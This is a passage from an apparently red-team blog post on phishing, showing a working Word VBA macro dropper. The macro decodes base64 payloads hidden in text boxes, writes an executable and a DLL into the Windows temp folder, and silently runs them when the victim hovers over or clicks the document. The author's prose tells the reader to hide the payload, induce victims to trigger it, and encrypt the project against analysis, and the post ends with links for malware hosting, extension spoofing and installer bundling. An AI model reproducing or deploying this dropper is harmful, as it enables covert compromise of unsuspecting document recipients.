class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Sub</span> Sleep <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Milliseconds <span class="keyword">As</span> LongPtr)</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> GetProcAddress <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> hModule <span class="keyword">As</span> LongPtr, <span class="keyword">ByVal</span> lpProcName <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> LoadLibrary <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;LoadLibraryA&quot;</span> (<span class="keyword">ByVal</span> lpLibFileName <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> VirtualProtect <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (lpAddress <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> dwSize <span class="keyword">As</span> LongPtr, <span class="keyword">ByVal</span> flNewProtect <span class="keyword">As</span> <span class="type">Long</span>, lpflOldProtect <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Sub</span> ByteSwapper <span class="keyword">Lib</span> <span class="string">&quot;kernel32.dll&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;RtlFillMemory&quot;</span> (Destination <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> length <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Fill <span class="keyword">As</span> <span class="type">Byte</span>)</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Sub</span> Peek <span class="keyword">Lib</span> <span class="string">&quot;msvcrt&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;memcpy&quot;</span> (<span class="keyword">ByRef</span> pDest <span class="keyword">As</span> Any, <span class="keyword">ByRef</span> pSource <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> nBytes <span class="keyword">As</span> <span class="type">Long</span>)</span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateProcess <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;CreateProcessA&quot;</span> (<span class="keyword">ByVal</span> lpApplicationName <span class="keyword">As</span> <span class="type">String</span>, <span class="keyword">ByVal</span> lpCommandLine <span class="keyword">As</span> <span class="type">String</span>, lpProcessAttributes <span class="keyword">As</span> Any, lpThreadAttributes <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> bInheritHandles <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> dwCreationFlags <span class="keyword">As</span> <span class="type">Long</span>, lpEnvironment <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> lpCurrentDriectory <span class="keyword">As</span> <span class="type">String</span>, lpStartupInfo <span class="keyword">As</span> STARTUPINFO, lpProcessInformation <span class="keyword">As</span> PROCESS_INFORMATION) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> OpenProcess <span class="keyword">Lib</span> <span class="string">&quot;kernel32.dll&quot;</span> (<span class="keyword">ByVal</span> dwAccess <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> fInherit <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> hObject <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> TerminateProcess <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> hProcess <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> uExitCode <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CloseHandle <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> hObject <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type PROCESS_INFORMATION</span><br><span class="line">    hProcess <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hThread <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwProcessId <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwThreadId <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> Type STARTUPINFO</span><br><span class="line">    cb <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    lpReserved <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    lpDesktop <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    lpTitle <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    dwX <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwY <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwXSize <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwYSize <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwXCountChars <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwYCountChars <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwFillAttribute <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    dwFlags <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    wShowWindow <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    cbReserved2 <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    lpReserved2 <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hStdInput <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hStdOutput <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    hStdError <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"><span class="keyword">End</span> Type</span><br><span class="line"></span><br><span class="line"><span class="keyword">Const</span> CREATE_NO_WINDOW = <span class="number">&amp;H8000000</span></span><br><span class="line"><span class="keyword">Const</span> CREATE_NEW_CONSOLE = <span class="number">&amp;H10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> fileExist(filePath)</span><br><span class="line">    <span class="keyword">Dim</span> fso</span><br><span class="line">    <span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">    <span class="keyword">If</span> fso.fileExists(filePath) <span class="keyword">Then</span></span><br><span class="line">        fileExist = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        fileExist = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> dddddd(B64 <span class="keyword">As</span> <span class="type">String</span>) <span class="keyword">As</span> <span class="type">Byte</span>()</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">GoTo</span> over</span><br><span class="line">    <span class="keyword">Dim</span> OutStr() <span class="keyword">As</span> <span class="type">Byte</span>, i <span class="keyword">As</span> <span class="type">Long</span>, j <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Const</span> B64_CHAR_DICT = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    <span class="keyword">If</span> InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span> B64 = Left(B64, InStr(<span class="number">1</span>, B64, <span class="string">&quot;=&quot;</span>) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">Dim</span> length <span class="keyword">As</span> <span class="type">Long</span>, mods <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    mods = Len(B64) <span class="built_in">Mod</span> <span class="number">4</span></span><br><span class="line">    length = Len(B64) - mods</span><br><span class="line">    <span class="keyword">ReDim</span> OutStr(length / <span class="number">4</span> * <span class="number">3</span> - <span class="number">1</span> + Switch(mods = <span class="number">0</span>, <span class="number">0</span>, mods = <span class="number">2</span>, <span class="number">1</span>, mods = <span class="number">3</span>, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> length <span class="keyword">Step</span> <span class="number">4</span></span><br><span class="line">        <span class="keyword">Dim</span> buf(<span class="number">3</span>) <span class="keyword">As</span> <span class="type">Byte</span></span><br><span class="line">        <span class="keyword">For</span> j = <span class="number">0</span> <span class="keyword">To</span> <span class="number">3</span></span><br><span class="line">            buf(j) = InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, i + j, <span class="number">1</span>)) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line">        OutStr((i - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span>) = buf(<span class="number">0</span>) * <span class="number">&amp;H4</span> + (buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">&amp;H10</span></span><br><span class="line">        OutStr((i - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = (buf(<span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + (buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">        OutStr((i - <span class="number">1</span>) / <span class="number">4</span> * <span class="number">3</span> + <span class="number">2</span>) = (buf(<span class="number">2</span>) <span class="built_in">And</span> <span class="number">&amp;H3</span>) * <span class="number">&amp;H40</span> + buf(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> mods = <span class="number">2</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">    <span class="keyword">ElseIf</span> mods = <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span>) = (InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">1</span>, <span class="number">1</span>)) - <span class="number">1</span>) * <span class="number">&amp;H4</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H30</span>) / <span class="number">16</span></span><br><span class="line">        OutStr(length / <span class="number">4</span> * <span class="number">3</span> + <span class="number">1</span>) = ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">2</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;HF</span>) * <span class="number">&amp;H10</span> + ((InStr(<span class="number">1</span>, B64_CHAR_DICT, <span class="keyword">Mid</span>(B64, length + <span class="number">3</span>, <span class="number">1</span>)) - <span class="number">1</span>) <span class="built_in">And</span> <span class="number">&amp;H3C</span>) / <span class="number">&amp;H4</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    dddddd = OutStr</span><br><span class="line"><span class="symbol">over:</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> runCommand(comando)</span><br><span class="line">    <span class="keyword">Dim</span> pInfo <span class="keyword">As</span> PROCESS_INFORMATION</span><br><span class="line">    <span class="keyword">Dim</span> sInfo <span class="keyword">As</span> STARTUPINFO</span><br><span class="line">    <span class="keyword">Dim</span> sNull <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> lSuccess <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">    <span class="keyword">Dim</span> lRetValue <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"></span><br><span class="line">    lSuccess = CreateProcess(sNull, comando, <span class="keyword">ByVal</span> <span class="number">0&amp;</span>, <span class="keyword">ByVal</span> <span class="number">0&amp;</span>, <span class="number">1&amp;</span>, CREATE_NO_WINDOW, <span class="keyword">ByVal</span> <span class="number">0&amp;</span>, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    lRetValue = CloseHandle(pInfo.hThread)</span><br><span class="line">    lRetValue = CloseHandle(pInfo.hProcess)</span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> WriteBinary(FileName, buf)</span><br><span class="line">  <span class="keyword">Dim</span> i, aBuf, Size, bStream</span><br><span class="line">  Size = UBound(buf): <span class="keyword">ReDim</span> aBuf(Size \ <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> Size - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">2</span></span><br><span class="line">      aBuf(i \ <span class="number">2</span>) = ChrW(buf(i + <span class="number">1</span>) * <span class="number">256</span> + buf(i))</span><br><span class="line">  <span class="keyword">Next</span></span><br><span class="line">  <span class="keyword">If</span> i = Size <span class="keyword">Then</span> aBuf(i \ <span class="number">2</span>) = ChrW(buf(i))</span><br><span class="line">  aBuf = <span class="keyword">Join</span>(aBuf, <span class="string">&quot;&quot;</span>)</span><br><span class="line">  <span class="keyword">Set</span> bStream = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">  bStream.Type = <span class="number">1</span>: bStream.Open</span><br><span class="line">  <span class="keyword">With</span> CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    .Type = <span class="number">2</span>: .Open: .WriteText aBuf</span><br><span class="line">    .Position = <span class="number">2</span>: .CopyTo bStream: .Close</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">  bStream.SaveToFile FileName, <span class="number">2</span>: bStream.Close</span><br><span class="line">  <span class="keyword">Set</span> bStream = <span class="literal">Nothing</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> releaseFile(path <span class="keyword">As</span> <span class="type">String</span>, conte <span class="keyword">As</span> <span class="type">String</span>)</span><br><span class="line"></span><br><span class="line">    hwminiArra = dddddd(conte)</span><br><span class="line">    WriteBinary path, hwminiArra</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> start()</span><br><span class="line">    <span class="keyword">Dim</span> filePath <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    filePath = <span class="string">&quot;C:\Windows\temp\aaaaaaa.exe&quot;</span></span><br><span class="line">    <span class="keyword">If</span> <span class="built_in">Not</span> fileExist(filePath) <span class="keyword">Then</span></span><br><span class="line">        releaseFile <span class="string">&quot;C:\Windows\temp\aaaaaaa.exe&quot;</span>, Replace(ActiveDocument.Shapes(<span class="number">1</span>).TextFrame.TextRange, Chr(<span class="number">13</span>), Empty)</span><br><span class="line">        releaseFile <span class="string">&quot;C:\Windows\temp\aaaaaaaaaaa.dll&quot;</span>, Replace(ActiveDocument.Shapes(<span class="number">2</span>).TextFrame.TextRange, Chr(<span class="number">13</span>), Empty)</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    runCommand (filePath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> TextBox2_MouseDown(<span class="keyword">ByVal</span> Button <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> Shift <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> X <span class="keyword">As</span> <span class="type">Single</span>, <span class="keyword">ByVal</span> Y <span class="keyword">As</span> <span class="type">Single</span>)</span><br><span class="line">    <span class="keyword">Static</span> i <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">If</span> i &lt; <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        start</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> TextBox2_MouseMove(<span class="keyword">ByVal</span> Button <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> Shift <span class="keyword">As</span> <span class="type">Integer</span>, <span class="keyword">ByVal</span> X <span class="keyword">As</span> <span class="type">Single</span>, <span class="keyword">ByVal</span> Y <span class="keyword">As</span> <span class="type">Single</span>)</span><br><span class="line">    <span class="keyword">Static</span> i <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">If</span> i &lt; <span class="number">3</span> <span class="keyword">Then</span></span><br><span class="line">        start</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>

<p>Remember to hide the textbox with base64 codes, and induce victims to trigger the macro when they click&#x2F;hover on some textbox (we can expand it into a whole page to make trigger easier). We can also encrypt the VB project to prevent reversing.</p>
<h2 id="Other-Resources"><a href="#Other-Resources" class="headerlink" title="Other Resources"></a>Other Resources</h2><p>Trusted domains that could be used for hosting malware or etc: <a class="link"   target="_blank" rel="noopener" href="https://lots-project.com/" >Living Off Trusted Sites (LOTS) Project<i class="fas fa-external-link-alt"></i></a></p>
<p>A simple program with a graphical user interface to spoof file extensions and icons: <a class="link"   target="_blank" rel="noopener" href="https://github.com/henriksb/ExtensionSpoofer" >FileSpoofer<i class="fas fa-external-link-alt"></i></a></p>
<p>Bundle install: <a class="link"   target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/MatryoshkaDollTool" >MatryoshkaDollTool<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.indigorose.com/setup-factory/" >Setup Factory<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://github.com/H4de5-7/Bundler-bypass" >Bundler-bypass<i class="fas fa-external-link-alt"></i></a></p>

                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/linux/">linux</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/windows/">windows</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pentest/">pentest</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="article-nav">
                        
                            <div class="article-prev">
                                <a class="prev"
                                   rel="prev"
                                   href="/2022/11/20/2022-11-20-LLVM-Commands/"
                                   title="LLVM Commands"
                                >
                                    <span class="left arrow-icon flex-center">
                                      <i class="fas fa-chevron-left"></i>
                                    </span>
                                            <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">LLVM Commands</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="article-next">
                                <a class="next"
                                   rel="next"
                                   href="/2022/03/26/2022-03-26-Binary-Code-Similarity-Detection-Papers/"
                                   title="Binary Code Similarity Detection Papers"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Binary Code Similarity Detection Papers</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                            <span class="right arrow-icon flex-center">
                                      <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Set-Up-Phishing-Mail-Server"><span class="nav-number">1.</span> <span class="nav-text">Set Up Phishing Mail Server</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Camouflage-Malicious-PE"><span class="nav-number">2.</span> <span class="nav-text">Camouflage Malicious PE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SFX"><span class="nav-number">2.1.</span> <span class="nav-text">SFX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DLL-Hijacking-amp-Recreate-the-Installer"><span class="nav-number">2.2.</span> <span class="nav-text">DLL Hijacking &amp; Recreate the Installer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Make-Evil-Links-x2F-Shotcuts"><span class="nav-number">3.</span> <span class="nav-text">Make Evil Links&#x2F;Shotcuts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-CHM-to-Phish"><span class="nav-number">4.</span> <span class="nav-text">Evil CHM to Phish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Create-Evil-Office-Suite"><span class="nav-number">5.</span> <span class="nav-text">Create Evil Office Suite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Word"><span class="nav-number">5.1.</span> <span class="nav-text">Macros in Word</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Macros-in-Excel"><span class="nav-number">5.2.</span> <span class="nav-text">Macros in Excel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OLE"><span class="nav-number">5.3.</span> <span class="nav-text">OLE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS"><span class="nav-number">5.4.</span> <span class="nav-text">JS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Template"><span class="nav-number">5.5.</span> <span class="nav-text">Template</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE"><span class="nav-number">5.6.</span> <span class="nav-text">CVE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phish-in-PPSX"><span class="nav-number">5.7.</span> <span class="nav-text">Phish in PPSX</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-Ultra-One"><span class="nav-number">5.8.</span> <span class="nav-text">The Ultra One</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Other-Resources"><span class="nav-number">6.</span> <span class="nav-text">Other Resources</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="border-box website-info-box default">
        
            <div class="copyright-info info-item default">
                &copy;&nbsp;<span>2018</span>&nbsp;-&nbsp;2024
                
                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">TyeYeah</a>
                
            </div>

            <div class="theme-info info-item default">
                Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
            </div>

            

            
        

        <div class="count-item info-item default">
            
                <span class="count-box border-box word">
                    <span class="item-type border-box">Total words</span>
                    <span class="item-value border-box word">135.4k</span>
                </span>
            

            

            
        </div>
    </div>
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="tools-list border-box">
        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
